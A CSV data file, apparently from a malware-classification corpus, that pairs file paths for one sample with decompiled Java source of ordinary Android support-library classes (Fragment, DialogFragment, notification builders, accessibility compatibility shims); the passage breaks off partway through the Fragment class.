"filepath","code"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@19e7a160"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatIcs.code","class AccessibilityServiceInfoCompatIcs {   AccessibilityServiceInfoCompatIcs(){   }   public static boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return info.getCanRetrieveWindowContent();   }   public static String getDescription(  AccessibilityServiceInfo info){     return info.getDescription();   }   public static String getId(  AccessibilityServiceInfo info){     return info.getId();   }   public static ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return info.getResolveInfo();   }   public static String getSettingsActivityName(  AccessibilityServiceInfo info){     return info.getSettingsActivityName();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.accessibilityservice\AccessibilityServiceInfoIcsImpl.code","static class AccessibilityServiceInfoIcsImpl extends AccessibilityServiceInfoStubImpl {   AccessibilityServiceInfoIcsImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getCanRetrieveWindowContent(info);   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getDescription(info);   }   @Override public String getId(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getId(info);   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getResolveInfo(info);   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getSettingsActivityName(info);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.accessibilityservice\AccessibilityServiceInfoStubImpl.code","static class AccessibilityServiceInfoStubImpl implements AccessibilityServiceInfoVersionImpl {   AccessibilityServiceInfoStubImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return false;   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return null;   }   @Override public String getId(  AccessibilityServiceInfo info){     return null;   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return null;   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.accessibilityservice\AccessibilityServiceInfoVersionImpl.code","interface AccessibilityServiceInfoVersionImpl {   boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo accessibilityServiceInfo);   String getDescription(  AccessibilityServiceInfo accessibilityServiceInfo);   String getId(  AccessibilityServiceInfo accessibilityServiceInfo);   ResolveInfo getResolveInfo(  AccessibilityServiceInfo accessibilityServiceInfo);   String getSettingsActivityName(  AccessibilityServiceInfo accessibilityServiceInfo); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\Action.code","public static class Action {   public PendingIntent actionIntent;   public int icon;   public CharSequence title;   public Action(  int icon_,  CharSequence title_,  PendingIntent intent_){     this.icon=icon_;     this.title=title_;     this.actionIntent=intent_;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ActivityCompat.code","public class ActivityCompat extends ContextCompat {   public static boolean invalidateOptionsMenu(  Activity activity){     if (Build.VERSION.SDK_INT < 11) {       return false;     }     ActivityCompatHoneycomb.invalidateOptionsMenu(activity);     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ActivityCompatHoneycomb.code","class ActivityCompatHoneycomb {   ActivityCompatHoneycomb(){   }   public static void invalidateOptionsMenu(  Activity activity){     activity.invalidateOptionsMenu();   }   static void dump(  Activity activity,  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     activity.dump(prefix,fd,writer,args);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\BackStackEntry.code","public interface BackStackEntry {   CharSequence getBreadCrumbShortTitle();   int getBreadCrumbShortTitleRes();   CharSequence getBreadCrumbTitle();   int getBreadCrumbTitleRes();   int getId();   String getName(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\BackStackRecord.code","!org.eclipse.jdt.core.dom.TypeDeclaration@167279d1"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel in){       return new BackStackState(in);     }     @Override public BackStackState[] newArray(    int size){       return new BackStackState[size];     }   } ;   final int mBreadCrumbShortTitleRes;   final CharSequence mBreadCrumbShortTitleText;   final int mBreadCrumbTitleRes;   final CharSequence mBreadCrumbTitleText;   final int mIndex;   final String mName;   final int[] mOps;   final int mTransition;   final int mTransitionStyle;   public BackStackState(  FragmentManagerImpl fm,  BackStackRecord bse){     int pos;     int numRemoved=0;     for (BackStackRecord.Op op=bse.mHead; op != null; op=op.next) {       if (op.removed != null) {         numRemoved+=op.removed.size();       }     }     this.mOps=new int[(bse.mNumOp * 7) + numRemoved];     if (!bse.mAddToBackStack) {       throw new IllegalStateException(""Not on back stack"");     }     BackStackRecord.Op op2=bse.mHead;     int pos2=0;     while (op2 != null) {       int pos3=pos2 + 1;       this.mOps[pos2]=op2.cmd;       int pos4=pos3 + 1;       this.mOps[pos3]=op2.fragment != null ? op2.fragment.mIndex : -1;       int pos5=pos4 + 1;       this.mOps[pos4]=op2.enterAnim;       int pos6=pos5 + 1;       this.mOps[pos5]=op2.exitAnim;       int pos7=pos6 + 1;       this.mOps[pos6]=op2.popEnterAnim;       int pos8=pos7 + 1;       this.mOps[pos7]=op2.popExitAnim;       if (op2.removed != null) {         int N=op2.removed.size();         this.mOps[pos8]=N;         int i=0;         int pos9=pos8 + 1;         while (i < N) {           this.mOps[pos9]=op2.removed.get(i).mIndex;           i++;           pos9++;         }         pos=pos9;       }  else {         pos=pos8 + 1;         this.mOps[pos8]=0;       }       op2=op2.next;       pos2=pos;     }     this.mTransition=bse.mTransition;     this.mTransitionStyle=bse.mTransitionStyle;     this.mName=bse.mName;     this.mIndex=bse.mIndex;     this.mBreadCrumbTitleRes=bse.mBreadCrumbTitleRes;     this.mBreadCrumbTitleText=bse.mBreadCrumbTitleText;     this.mBreadCrumbShortTitleRes=bse.mBreadCrumbShortTitleRes;     this.mBreadCrumbShortTitleText=bse.mBreadCrumbShortTitleText;   }   public BackStackState(  Parcel in){     this.mOps=in.createIntArray();     this.mTransition=in.readInt();     this.mTransitionStyle=in.readInt();     this.mName=in.readString();     this.mIndex=in.readInt();     this.mBreadCrumbTitleRes=in.readInt();     this.mBreadCrumbTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);     this.mBreadCrumbShortTitleRes=in.readInt();     this.mBreadCrumbShortTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);   }   public BackStackRecord instantiate(  FragmentManagerImpl fm){     BackStackRecord bse=new BackStackRecord(fm);     int pos=0;     int num=0;     while (pos < this.mOps.length) {       BackStackRecord.Op op=new BackStackRecord.Op();       int pos2=pos + 1;       op.cmd=this.mOps[pos];       if (FragmentManagerImpl.DEBUG) {         Log.v(""FragmentManager"",""Instantiate "" + bse + "" op #""+ num+ "" base fragment #""+ this.mOps[pos2]);       }       int pos3=pos2 + 1;       int findex=this.mOps[pos2];       if (findex >= 0) {         Fragment f=fm.mActive.get(findex);         op.fragment=f;       }  else {         op.fragment=null;       }       int pos4=pos3 + 1;       op.enterAnim=this.mOps[pos3];       int pos5=pos4 + 1;       op.exitAnim=this.mOps[pos4];       int pos6=pos5 + 1;       op.popEnterAnim=this.mOps[pos5];       int pos7=pos6 + 1;       op.popExitAnim=this.mOps[pos6];       int pos8=pos7 + 1;       int N=this.mOps[pos7];       if (N > 0) {         op.removed=new ArrayList<>(N);         int i=0;         while (i < N) {           if (FragmentManagerImpl.DEBUG) {             Log.v(""FragmentManager"",""Instantiate "" + bse + "" set remove fragment #""+ this.mOps[pos8]);           }           Fragment r=fm.mActive.get(this.mOps[pos8]);           op.removed.add(r);           i++;           pos8++;         }       }       pos=pos8;       bse.addOp(op);       num++;     }     bse.mTransition=this.mTransition;     bse.mTransitionStyle=this.mTransitionStyle;     bse.mName=this.mName;     bse.mIndex=this.mIndex;     bse.mAddToBackStack=true;     bse.mBreadCrumbTitleRes=this.mBreadCrumbTitleRes;     bse.mBreadCrumbTitleText=this.mBreadCrumbTitleText;     bse.mBreadCrumbShortTitleRes=this.mBreadCrumbShortTitleRes;     bse.mBreadCrumbShortTitleText=this.mBreadCrumbShortTitleText;     bse.bumpBackStackNesting(1);     return bse;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeIntArray(this.mOps);     dest.writeInt(this.mTransition);     dest.writeInt(this.mTransitionStyle);     dest.writeString(this.mName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mBreadCrumbTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbTitleText,dest,0);     dest.writeInt(this.mBreadCrumbShortTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbShortTitleText,dest,0);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\BigPictureStyle.code","public static class BigPictureStyle extends Style {   Bitmap mPicture;   public BigPictureStyle(){   }   public BigPictureStyle(  Builder builder){     setBuilder(builder);   }   public BigPictureStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigPictureStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigPictureStyle bigPicture(  Bitmap b){     this.mPicture=b;     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\BigTextStyle.code","public static class BigTextStyle extends Style {   CharSequence mBigText;   public BigTextStyle(){   }   public BigTextStyle(  Builder builder){     setBuilder(builder);   }   public BigTextStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigTextStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigTextStyle bigText(  CharSequence cs){     this.mBigText=cs;     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\Builder.code","public static class Builder {   CharSequence mContentInfo;   PendingIntent mContentIntent;   CharSequence mContentText;   CharSequence mContentTitle;   Context mContext;   PendingIntent mFullScreenIntent;   Bitmap mLargeIcon;   int mNumber;   int mPriority;   int mProgress;   boolean mProgressIndeterminate;   int mProgressMax;   Style mStyle;   CharSequence mSubText;   RemoteViews mTickerView;   boolean mUseChronometer;   ArrayList<Action> mActions=new ArrayList<>();   Notification mNotification=new Notification();   public Builder(  Context context){     this.mContext=context;     this.mNotification.when=System.currentTimeMillis();     this.mNotification.audioStreamType=-1;     this.mPriority=0;   }   public Builder setWhen(  long when){     this.mNotification.when=when;     return this;   }   public Builder setUsesChronometer(  boolean b){     this.mUseChronometer=b;     return this;   }   public Builder setSmallIcon(  int icon){     this.mNotification.icon=icon;     return this;   }   public Builder setSmallIcon(  int icon,  int level){     this.mNotification.icon=icon;     this.mNotification.iconLevel=level;     return this;   }   public Builder setContentTitle(  CharSequence title){     this.mContentTitle=title;     return this;   }   public Builder setContentText(  CharSequence text){     this.mContentText=text;     return this;   }   public Builder setSubText(  CharSequence text){     this.mSubText=text;     return this;   }   public Builder setNumber(  int number){     this.mNumber=number;     return this;   }   public Builder setContentInfo(  CharSequence info){     this.mContentInfo=info;     return this;   }   public Builder setProgress(  int max,  int progress,  boolean indeterminate){     this.mProgressMax=max;     this.mProgress=progress;     this.mProgressIndeterminate=indeterminate;     return this;   }   public Builder setContent(  RemoteViews views){     this.mNotification.contentView=views;     return this;   }   public Builder setContentIntent(  PendingIntent intent){     this.mContentIntent=intent;     return this;   }   public Builder setDeleteIntent(  PendingIntent intent){     this.mNotification.deleteIntent=intent;     return this;   }   public Builder setFullScreenIntent(  PendingIntent intent,  boolean highPriority){     this.mFullScreenIntent=intent;     setFlag(128,highPriority);     return this;   }   public Builder setTicker(  CharSequence tickerText){     this.mNotification.tickerText=tickerText;     return this;   }   public Builder setTicker(  CharSequence tickerText,  RemoteViews views){     this.mNotification.tickerText=tickerText;     this.mTickerView=views;     return this;   }   public Builder setLargeIcon(  Bitmap icon){     this.mLargeIcon=icon;     return this;   }   public Builder setSound(  Uri sound){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=-1;     return this;   }   public Builder setSound(  Uri sound,  int streamType){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=streamType;     return this;   }   public Builder setVibrate(  long[] pattern){     this.mNotification.vibrate=pattern;     return this;   }   public Builder setLights(  int argb,  int onMs,  int offMs){     this.mNotification.ledARGB=argb;     this.mNotification.ledOnMS=onMs;     this.mNotification.ledOffMS=offMs;     boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;     this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));     return this;   }   public Builder setOngoing(  boolean ongoing){     setFlag(2,ongoing);     return this;   }   public Builder setOnlyAlertOnce(  boolean onlyAlertOnce){     setFlag(8,onlyAlertOnce);     return this;   }   public Builder setAutoCancel(  boolean autoCancel){     setFlag(16,autoCancel);     return this;   }   public Builder setDefaults(  int defaults){     this.mNotification.defaults=defaults;     if ((defaults & 4) != 0) {       this.mNotification.flags|=1;     }     return this;   }   private void setFlag(  int mask,  boolean value){     if (value) {       this.mNotification.flags|=mask;     }  else {       this.mNotification.flags&=mask ^ (-1);     }   }   public Builder setPriority(  int pri){     this.mPriority=pri;     return this;   }   public Builder addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.mActions.add(new Action(icon,title,intent));     return this;   }   public Builder setStyle(  Style style){     if (this.mStyle != style) {       this.mStyle=style;       if (this.mStyle != null) {         this.mStyle.setBuilder(this);       }     }     return this;   }   @Deprecated public Notification getNotification(){     return NotificationCompat.IMPL.build(this);   }   public Notification build(){     return NotificationCompat.IMPL.build(this);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\DialogFragment.code","public class DialogFragment extends Fragment implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   private static final String SAVED_BACK_STACK_ID=""android:backStackId"";   private static final String SAVED_CANCELABLE=""android:cancelable"";   private static final String SAVED_DIALOG_STATE_TAG=""android:savedDialogState"";   private static final String SAVED_SHOWS_DIALOG=""android:showsDialog"";   private static final String SAVED_STYLE=""android:style"";   private static final String SAVED_THEME=""android:theme"";   public static final int STYLE_NORMAL=0;   public static final int STYLE_NO_FRAME=2;   public static final int STYLE_NO_INPUT=3;   public static final int STYLE_NO_TITLE=1;   Dialog mDialog;   boolean mDismissed;   boolean mShownByMe;   boolean mViewDestroyed;   int mStyle=0;   int mTheme=0;   boolean mCancelable=true;   boolean mShowsDialog=true;   int mBackStackId=-1;   public void setStyle(  int style,  int theme){     this.mStyle=style;     if (this.mStyle == 2 || this.mStyle == 3) {       this.mTheme=R.style.Theme.Panel;     }     if (theme != 0) {       this.mTheme=theme;     }   }   public void show(  FragmentManager manager,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     FragmentTransaction ft=manager.beginTransaction();     ft.add(this,tag);     ft.commit();   }   public int show(  FragmentTransaction transaction,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     transaction.add(this,tag);     this.mViewDestroyed=false;     this.mBackStackId=transaction.commit();     return this.mBackStackId;   }   public void dismiss(){     dismissInternal(false);   }   public void dismissAllowingStateLoss(){     dismissInternal(true);   }   void dismissInternal(  boolean allowStateLoss){     if (!this.mDismissed) {       this.mDismissed=true;       this.mShownByMe=false;       if (this.mDialog != null) {         this.mDialog.dismiss();         this.mDialog=null;       }       this.mViewDestroyed=true;       if (this.mBackStackId >= 0) {         getFragmentManager().popBackStack(this.mBackStackId,1);         this.mBackStackId=-1;         return;       }       FragmentTransaction ft=getFragmentManager().beginTransaction();       ft.remove(this);       if (allowStateLoss) {         ft.commitAllowingStateLoss();       }  else {         ft.commit();       }     }   }   public Dialog getDialog(){     return this.mDialog;   }   public int getTheme(){     return this.mTheme;   }   public void setCancelable(  boolean cancelable){     this.mCancelable=cancelable;     if (this.mDialog != null) {       this.mDialog.setCancelable(cancelable);     }   }   public boolean isCancelable(){     return this.mCancelable;   }   public void setShowsDialog(  boolean showsDialog){     this.mShowsDialog=showsDialog;   }   public boolean getShowsDialog(){     return this.mShowsDialog;   }   @Override public void onAttach(  Activity activity){     super.onAttach(activity);     if (!this.mShownByMe) {       this.mDismissed=false;     }   }   @Override public void onDetach(){     super.onDetach();     if (!this.mShownByMe && !this.mDismissed) {       this.mDismissed=true;     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     this.mShowsDialog=this.mContainerId == 0;     if (savedInstanceState != null) {       this.mStyle=savedInstanceState.getInt(SAVED_STYLE,0);       this.mTheme=savedInstanceState.getInt(SAVED_THEME,0);       this.mCancelable=savedInstanceState.getBoolean(SAVED_CANCELABLE,true);       this.mShowsDialog=savedInstanceState.getBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog);       this.mBackStackId=savedInstanceState.getInt(SAVED_BACK_STACK_ID,-1);     }   }   @Override public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     if (!this.mShowsDialog) {       return super.getLayoutInflater(savedInstanceState);     }     this.mDialog=onCreateDialog(savedInstanceState); switch (this.mStyle) { case 3:       this.mDialog.getWindow().addFlags(24); case 1: case 2:     this.mDialog.requestWindowFeature(1);   break; } if (this.mDialog != null) { return (LayoutInflater)this.mDialog.getContext().getSystemService(""layout_inflater""); } return (LayoutInflater)this.mActivity.getSystemService(""layout_inflater""); } public Dialog onCreateDialog(Bundle savedInstanceState){ return new Dialog(getActivity(),getTheme()); } @Override public void onCancel(DialogInterface dialog){ } @Override public void onDismiss(DialogInterface dialog){ if (!this.mViewDestroyed) { dismissInternal(true); } } @Override public void onActivityCreated(Bundle savedInstanceState){ Bundle dialogState; super.onActivityCreated(savedInstanceState); if (this.mShowsDialog) { View view=getView(); if (view != null) {   if (view.getParent() != null) {     throw new IllegalStateException(""DialogFragment can not be attached to a container view"");   }   this.mDialog.setContentView(view); } this.mDialog.setOwnerActivity(getActivity()); this.mDialog.setCancelable(this.mCancelable); this.mDialog.setOnCancelListener(this); this.mDialog.setOnDismissListener(this); if (savedInstanceState != null && (dialogState=savedInstanceState.getBundle(SAVED_DIALOG_STATE_TAG)) != null) {   this.mDialog.onRestoreInstanceState(dialogState); } } } @Override public void onStart(){ super.onStart(); if (this.mDialog != null) { this.mViewDestroyed=false; this.mDialog.show(); } } @Override public void onSaveInstanceState(Bundle outState){ Bundle dialogState; super.onSaveInstanceState(outState); if (this.mDialog != null && (dialogState=this.mDialog.onSaveInstanceState()) != null) { outState.putBundle(SAVED_DIALOG_STATE_TAG,dialogState); } if (this.mStyle != 0) { outState.putInt(SAVED_STYLE,this.mStyle); } if (this.mTheme != 0) { outState.putInt(SAVED_THEME,this.mTheme); } if (!this.mCancelable) { outState.putBoolean(SAVED_CANCELABLE,this.mCancelable); } if (!this.mShowsDialog) { outState.putBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog); } if (this.mBackStackId != -1) { outState.putInt(SAVED_BACK_STACK_ID,this.mBackStackId); } } @Override public void onStop(){ super.onStop(); if (this.mDialog != null) { this.mDialog.hide(); } } @Override public void onDestroyView(){ super.onDestroyView(); if (this.mDialog != null) { this.mViewDestroyed=true; this.mDialog.dismiss(); this.mDialog=null; } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\DummyTabFactory.code","static class DummyTabFactory implements TabHost.TabContentFactory {   private final Context mContext;   public DummyTabFactory(  Context context){     this.mContext=context;   }   @Override public View createTabContent(  String tag){     View v=new View(this.mContext);     v.setMinimumWidth(0);     v.setMinimumHeight(0);     return v;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   private static final HashMap<String,Class<?>> sClassMap=new HashMap<>();   FragmentActivity mActivity;   boolean mAdded;   View mAnimatingAway;   Bundle mArguments;   int mBackStackNesting;   boolean mCalled;   boolean mCheckedForLoaderManager;   FragmentManagerImpl mChildFragmentManager;   ViewGroup mContainer;   int mContainerId;   boolean mDeferStart;   boolean mDetached;   int mFragmentId;   FragmentManagerImpl mFragmentManager;   boolean mFromLayout;   boolean mHasMenu;   boolean mHidden;   boolean mInLayout;   View mInnerView;   LoaderManagerImpl mLoaderManager;   boolean mLoadersStarted;   int mNextAnim;   Fragment mParentFragment;   boolean mRemoving;   boolean mRestored;   boolean mResumed;   boolean mRetainInstance;   boolean mRetaining;   Bundle mSavedFragmentState;   SparseArray<Parcelable> mSavedViewState;   int mStateAfterAnimating;   String mTag;   Fragment mTarget;   int mTargetRequestCode;   View mView;   String mWho;   int mState=0;   int mIndex=-1;   int mTargetIndex=-1;   boolean mMenuVisible=true;   boolean mUserVisibleHint=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in,null);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     final Bundle mState;     public SavedState(    Bundle state){       this.mState=state;     }     SavedState(    Parcel in,    ClassLoader loader){       this.mState=in.readBundle();       if (loader != null && this.mState != null) {         this.mState.setClassLoader(loader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel dest,    int flags){       dest.writeBundle(this.mState);     }   } public static class InstantiationException extends RuntimeException {     public InstantiationException(    String msg,    Exception cause){       super(msg,cause);     }   }   public static Fragment instantiate(  Context context,  String fname){     return instantiate(context,fname,null);   }   public static Fragment instantiate(  Context context,  String fname,  Bundle args){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       Fragment f=(Fragment)clazz.newInstance();       if (args != null) {         args.setClassLoader(f.getClass().getClassLoader());         f.mArguments=args;       }       return f;     }  catch (    ClassNotFoundException e) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    java.lang.InstantiationException e3) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public final void restoreViewState(  Bundle savedInstanceState){     if (this.mSavedViewState != null) {       this.mInnerView.restoreHierarchyState(this.mSavedViewState);       this.mSavedViewState=null;     }     this.mCalled=false;     onViewStateRestored(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onViewStateRestored()"");     }   }   public final void setIndex(  int index,  Fragment parent){     this.mIndex=index;     if (parent != null) {       this.mWho=parent.mWho + "":"" + this.mIndex;     }  else {       this.mWho=""android:fragment:"" + this.mIndex;     }   }   public final boolean isInBackStack(){     return this.mBackStackNesting > 0;   }   public final boolean equals(  Object o){     return super.equals(o);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     DebugUtils.buildShortClassTag(this,sb);     if (this.mIndex >= 0) {       sb.append("" #"");       sb.append(this.mIndex);     }     if (this.mFragmentId != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.mFragmentId));     }     if (this.mTag != null) {       sb.append("" "");       sb.append(this.mTag);     }     sb.append('}');     return sb.toString();   }   public final int getId(){     return this.mFragmentId;   }   public final String getTag(){     return this.mTag;   }   public void setArguments(  Bundle args){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mArguments=args;   }   public final Bundle getArguments(){     return this.mArguments;   }   public void setInitialSavedState(  SavedState state){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mSavedFragmentState=(state == null || state.mState == null) ? null : state.mState;   }   public void setTargetFragment(  Fragment fragment,  int requestCode){     this.mTarget=fragment;     this.mTargetRequestCode=requestCode;   }   public final Fragment getTargetFragment(){     return this.mTarget;   }   public final int getTargetRequestCode(){     return this.mTargetRequestCode;   }   public final FragmentActivity getActivity(){     return this.mActivity;   }   public final Resources getResources(){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     return this.mActivity.getResources();   }   public final CharSequence getText(  int resId){     return getResources().getText(resId);   }   public final String getString(  int resId){     return getResources().getString(resId);   }   public final String getString(  int resId,  Object... formatArgs){     return getResources().getString(resId,formatArgs);   }   public final FragmentManager getFragmentManager(){     return this.mFragmentManager;   }   public final FragmentManager getChildFragmentManager(){     if (this.mChildFragmentManager == null) {       instantiateChildFragmentManager();       if (this.mState >= 5) {         this.mChildFragmentManager.dispatchResume();       }  else       if (this.mState >= 4) {         this.mChildFragmentManager.dispatchStart();       }  else       if (this.mState >= 2) {         this.mChildFragmentManager.dispatchActivityCreated();       }  else       if (this.mState >= 1) {         this.mChildFragmentManager.dispatchCreate();       }     }     return this.mChildFragmentManager;   }   public final Fragment getParentFragment(){     return this.mParentFragment;   }   public final boolean isAdded(){     return this.mActivity != null && this.mAdded;   }   public final boolean isDetached(){     return this.mDetached;   }   public final boolean isRemoving(){     return this.mRemoving;   }   public final boolean isInLayout(){     return this.mInLayout;   }   public final boolean isResumed(){     return this.mResumed;   }   public final boolean isVisible(){     return (!isAdded() || isHidden() || this.mView == null || this.mView.getWindowToken() == null || this.mView.getVisibility() != 0) ? false : true;   }   public final boolean isHidden(){     return this.mHidden;   }   public void onHiddenChanged(  boolean hidden){   }   public void setRetainInstance(  boolean retain){     if (retain && this.mParentFragment != null) {       throw new IllegalStateException(""Can't retain fragements that are nested in other fragments"");     }     this.mRetainInstance=retain;   }   public final boolean getRetainInstance(){     return this.mRetainInstance;   }   public void setHasOptionsMenu(  boolean hasMenu){     if (this.mHasMenu != hasMenu) {       this.mHasMenu=hasMenu;       if (isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setMenuVisibility(  boolean menuVisible){     if (this.mMenuVisible != menuVisible) {       this.mMenuVisible=menuVisible;       if (this.mHasMenu && isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setUserVisibleHint(  boolean isVisibleToUser){     if (!this.mUserVisibleHint && isVisibleToUser && this.mState < 4) {       this.mFragmentManager.performPendingDeferredStart(this);     }     this.mUserVisibleHint=isVisibleToUser;     this.mDeferStart=!isVisibleToUser;   }   public boolean getUserVisibleHint(){     return this.mUserVisibleHint;   }   public LoaderManager getLoaderManager(){     if (this.mLoaderManager != null) {       return this.mLoaderManager;     }     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mCheckedForLoaderManager=true;     this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,true);     return this.mLoaderManager;   }   public void startActivity(  Intent intent){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,-1);   }   public void startActivityForResult(  Intent intent,  int requestCode){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,requestCode);   }   public void onActivityResult(  int requestCode,  int resultCode,  Intent data){   }   public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     return this.mActivity.getLayoutInflater();   }   public void onInflate(  Activity activity,  AttributeSet attrs,  Bundle savedInstanceState){     this.mCalled=true;   }   public void onAttach(  Activity activity){     this.mCalled=true;   }   public Animation onCreateAnimation(  int transit,  boolean enter,  int nextAnim){     return null;   }   public void onCreate(  Bundle savedInstanceState){     this.mCalled=true;   }   public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     return null;   }   public void onViewCreated(  View view,  Bundle savedInstanceState){   }   public View getView(){     return this.mView;   }   public void onActivityCreated(  Bundle savedInstanceState){     this.mCalled=true;   